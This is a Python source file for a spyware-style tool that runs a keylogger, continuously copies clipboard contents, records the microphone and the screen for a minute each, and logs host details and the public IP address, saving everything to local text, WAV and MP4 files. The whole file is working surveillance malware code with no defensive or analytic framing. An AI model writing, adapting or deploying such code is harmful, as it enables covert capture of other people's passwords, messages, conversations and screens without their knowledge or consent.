import pynput
import datetime
import threading
import socket
import platform
import requests
import pyperclip
import pyaudio
import wave
import cv2
import pyautogui
import numpy as np
from requests import get 
from scipy.io.wavfile import read, write
from pynput.keyboard import Key, Listener

WAV_FILENAME = "soundrec.wav"
MP4_FILENAME = "screenrec.mp4"
SCREEN_RECORDING_FPS = 3
SCREEN_RECORDING_SECONDS = 60
MP4_FOURCC = 1983148141
SCREEN_SIZE = (2560, 1600) 
CHUNK_IN_BYTES = 1024
SOUND_FORMAT = pyaudio.paInt16
CHANNELS = 1
SAMPLE_RATE = 44100
SOUND_RECORD_SECONDS = 60


def press_keys(key):
	keys = []
	keys.append(key)
	current_date_time = datetime.datetime.now()
	write_readable_file(keys, current_date_time)
	write_log_file(keys, current_date_time)
	keys  = []


def write_log_file(keys, current_date_time):
	with open("log.text", "a") as file:
		for key in keys:
			file.write(str(key))
			file.write(str(current_date_time))
			file.write("\n")

def write_readable_file(keys, date_time):
	with open("keys.text", "a") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write(" ")
				file.write(str(date_time))
				file.write('\n')
			elif k.find("Key") == -1:
				file.write(k)

def write_machine_info_file():
	with open("mach_info.text", "a") as file:
		file.write("Host name: %s" %socket.gethostname())
		file.write("\n")
		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
		file.write("\n")
		file.write("Processor type: %s" %platform.processor())
		file.write("\n")
		file.write("System type: %s" %platform.system())
		file.write("\n")
		file.write("Machine type: %s" %platform.machine())
		file.write("\n")
		file.write("Machine version: %s" %platform.version())
		file.write("\n")
		file.write("public IP: %s" %get('https://api.ipify.org').text)

def get_clipboard_history():
	clipboard_history = ""
	open("clipboard_hist.text", "w")
	while True:
		with open("clipboard_hist.text", "a") as file:
			file.write(str(pyperclip.paste()))
			file.write("\n")
		clipboard_history = pyperclip.paste()

def record_sound():
	my_pyaudio = pyaudio.PyAudio()
	stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,input=True,
						  output=True,frames_per_buffer=CHUNK_IN_BYTES)
	frames = []
	print("Recording...")
	for i in range(int(SAMPLE_RATE / CHUNK_IN_BYTES * SOUND_RECORD_SECONDS)):
		data = stream.read(CHUNK_IN_BYTES)
		frames.append(data)
	print("Finished recording.")
	stream.stop_stream()
	stream.close()
	my_pyaudio.terminate()
	# Generating an audio (wav) file.
	wave_file = wave.open(WAV_FILENAME, "wb")
	wave_file.setnchannels(CHANNELS)
	wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
	wave_file.setframerate(SAMPLE_RATE)
	wave_file.writeframes(b"".join(frames))
	wave_file.close()

def record_screen():
	video_file = cv2.VideoWriter(MP4_FILENAME, MP4_FOURCC, SCREEN_RECORDING_FPS, SCREEN_SIZE)
	for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
		screenshot = pyautogui.screenshot()
		frame = np.array(screenshot)
		frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
		video_file.write(frame)
	cv2.destroyAllWindows()
	video_file.release()

def main():
	machine_info = threading.Thread(target=write_machine_info_file)
	machine_info.start()
	clipboard_history = threading.Thread(target=get_clipboard_history)
	clipboard_history.start()
	sound_recording = threading.Thread(target=record_sound)
	sound_recording.start()
	screen_recording = threading.Thread(target=record_screen)
	screen_recording.start()
	with Listener(on_press=press_keys) as listener:
		listener.join()

if __name__ == '__main__':
	main()